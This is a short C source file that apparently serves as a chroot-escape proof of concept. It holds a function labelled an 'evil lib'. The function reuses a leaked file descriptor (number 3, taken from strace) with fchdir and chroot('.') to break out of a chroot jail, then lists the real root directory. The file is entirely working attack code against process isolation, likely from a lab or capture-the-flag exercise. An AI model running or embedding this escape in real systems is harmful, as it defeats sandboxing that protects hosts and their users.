#include <stdio.h>
#include <unistd.h>

#include "ls_root.h"

void action() {
	int file_des = 3; // from strace

	fchdir(file_des);
	chroot(".");
	printf("Evil lib escaped!\n");

	ls_root();
}

